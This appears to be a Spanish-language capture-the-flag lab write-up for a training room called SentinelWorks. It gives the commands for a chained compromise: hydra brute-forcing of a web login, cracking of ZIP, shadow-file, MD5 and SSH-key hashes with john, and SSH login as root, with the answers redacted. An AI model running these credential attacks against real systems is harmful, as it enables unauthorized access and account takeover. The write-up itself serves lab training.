# Contrato 6 — SentinelWorks (Explotación encadenada)

- **Serie:** Cyber Security Contractor (Cyber Security 101)
- **Fecha:** 2026-10-07
- **Dominio:** Auditoría de passwords/keys → cadena completa web→SSH→root
- **Acceso:** Attack Box / VPN contra target.
- **Cadena:** nmap → hydra → gobuster → zip2john → unshadow/john → SSH → MD5 → KeyWatch → ssh2john → root → César

## Preguntas y comandos

### Q1 — Puertos TCP abiertos
```bash
nmap -p- -sV -T4 <IP>
```
22 (SSH), 80 (SentinelFiles), 19283 (KeyWatch, high port) → **[REDACTADO]**

### Q2 — Brute-force login SentinelFiles (admin)
Form POST en `/index.php`, campos `username`/`password`, error = "Invalid credentials".
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid credentials" -V
```
⚠️ Falsos positivos si el `F=` es incorrecto (todas "válidas"). Conseguir el mensaje real:
```bash
curl -s -d "username=admin&password=X" http://<IP>/index.php | grep -i error
```
→ **[REDACTADO]**

### Q3 — Endpoint PHP que descarga ZIP
```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```
`backup.php` (302) → **[REDACTADO]**

### Q4 — Password del ZIP cifrado
Descargar con cookie de sesión, extraer hash, crackear:
```bash
curl -s -b "PHPSESSID=<cookie>" http://<IP>/backup.php -o backup.zip
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
john zip.hash --show
```
ZIP contiene: readme.txt, passwd.bak, shadow.bak → **[REDACTADO]**

### Q5 — Usuario recuperable del ZIP
```bash
unzip backup.zip          # pass: <password del ZIP>
unshadow passwd.bak shadow.bak > unshadowed.txt
john unshadowed.txt --wordlist=/usr/share/wordlists/rockyou.txt --fork=4
john unshadowed.txt --show
```
`usuario:password` (cae rápido) → **[REDACTADO]**

> ⚠️ SHA-512 (`$6$`) es lento. El "Time.Estimated" de hashcat/john = tiempo para EXHAUSTIR la lista, NO lo que tarda en encontrar una pass débil (esas caen en segundos). En CPU, **john** suele ir más rápido que hashcat-pocl para `$6$`. El crackeo corre en el Attack Box, no depende del timer de la VM.

### Q6 — SSH como will + SHA-256 de note.txt
```bash
ssh will@<IP>             # pass: <password de will>
sha256sum note.txt        # Q6
cat note.txt              # base64 → leer
```
→ **[REDACTADO]**

note.txt (base64) revelaba: hay clave privada SSH de root en KeyWatch (passphrase "la de siempre"),
y el password de key_manager como hash MD5: `[hash-redactado]`.

### Q7 — Tipo de hash del note
32 caracteres hex → **[REDACTADO]** (confirmable con `hashid`)

### Q8 — Crackear MD5 → password de key_manager (en el Attack Box)
```bash
echo "[hash-redactado]" > md5.hash
john md5.hash --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
john md5.hash --format=raw-md5 --show
```
→ **[REDACTADO]**

### Q9 — Passphrase de la clave SSH root (en KeyWatch)
Login en `http://<IP>:19283` como key_manager / <password>.
Descargar la clave privada root (completa, con BEGIN/END), luego:
```bash
python3 /opt/john/ssh2john.py root_key > sshkey.hash
john sshkey.hash --wordlist=/usr/share/wordlists/rockyou.txt
john sshkey.hash --show
```
(la nota decía "passphrase de siempre" → probar passwords conocidas primero)
→ **[REDACTADO]**

### Q10 — SSH root + descifrar .eml (César)
```bash
ssh -i root_key root@<IP>     # passphrase: <passphrase>
cat /root/*.eml
```
Texto cifrado César shift 5 (Kwtr→From). Descifrar:
```bash
cat /root/*.eml | tr 'A-Za-z' 'V-ZA-Uv-za-u'
```
Subject → **[REDACTADO]**

## Respuestas
| Q | Respuesta |
|---|---|
| 1 | [REDACTADO] |
| 2 | [REDACTADO] |
| 3 | [REDACTADO] |
| 4 | [REDACTADO] |
| 5 | [REDACTADO] |
| 6 | [REDACTADO] |
| 7 | [REDACTADO] |
| 8 | [REDACTADO] |
| 9 | [REDACTADO] |
| 10 | [REDACTADO] |

## Aprendizajes
- Patrón `*2john`: zip2john, ssh2john (en `/opt/john/`), unshadow+john.
- hydra con form: conseguir el mensaje de error REAL para `F=` (si no → falsos positivos). Alternativa: `S=` (éxito).
- Backups de `/etc/passwd`+`/etc/shadow` → `unshadow` → crackear.
- El "estimated" de los crackers ≠ tiempo real para una pass débil.
- Encadenar credenciales entre servicios (note → MD5 → KeyWatch → clave root).
- César: identificar shift por una palabra conocida (From, Subject), luego `tr`.
